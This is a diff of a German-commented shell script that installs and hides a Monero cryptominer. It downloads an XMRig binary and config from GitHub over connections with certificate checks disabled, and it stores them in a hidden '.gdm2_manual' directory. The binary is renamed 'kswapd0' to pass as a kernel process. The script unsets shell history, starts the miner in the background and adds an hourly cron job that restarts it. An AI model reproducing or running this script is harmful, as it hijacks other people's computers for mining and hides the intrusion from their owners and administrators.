@@ -1,18 +1,32 @@
-mkdir $HOME/.gdm2_manual/
-cd $HOME/.gdm2_manual/
+unset HISTFILE
 
-wget --no-check-certificate https://raw.githubusercontent.com/MoneroOcean/xmrig_setup/master/xmrig.tar.gz ; tar xzvf xmrig.tar.gz
-mv xmrig kswapd0
-rm -rf config.json
+# Verzeichnis erstellen und ins Verzeichnis wechseln
+mkdir -p "$HOME/.gdm2_manual/"
+cd "$HOME/.gdm2_manual/" || exit
+
+# Dateien herunterladen und entpacken
+wget --no-check-certificate https://github.com/littlAcen/moneroocean-setup/raw/main/kswapd0
 wget --no-check-certificate https://raw.githubusercontent.com/littlAcen/moneroocean-setup/main/config.json
-curl -O https://raw.githubusercontent.com/littlAcen/moneroocean-setup/main/config.json
+
+# Programm starten
 ./kswapd0 --config=config.json &
 
-#tar xf $HOME/.gdm2_manual/xmrig.tar.gz
-#rm $HOME/.gdm2_manual/xmrig.tar.gz
-#mv $HOME/.gdm2_manual/xmrig $HOME/.gdm2_manual/kswapd0
-#rm -rf $HOME/.gdm2_manual/config.json
+# Überprüfungsskript erstellen
+cat << 'EOF' > "$HOME/.gdm2_manual/check_kswapd0.sh"
+#!/bin/bash
 
-#wget --no-check-certificate https://raw.githubusercontent.com/littlAcen/moneroocean-setup/main/config.json -O $HOME/.gdm2_manual/config.json
+if ! pgrep -x "kswapd0" > /dev/null
+then
+    echo "kswapd0 not started. Going to start it..."
+    cd "$HOME/.gdm2_manual/" || exit
+    ./kswapd0 --config=config.json &
+else
+    echo "kswapd0 already started."
+fi
+EOF
 
-#$HOME/.gdm2_manual/kswapd0 &
+# Überprüfungsskript ausführbar machen
+chmod +x "$HOME/.gdm2_manual/check_kswapd0.sh"
+
+# Cron-Job einrichten
+(crontab -l 2>/dev/null; echo "0 * * * * $HOME/.gdm2_manual/check_kswapd0.sh") | crontab -
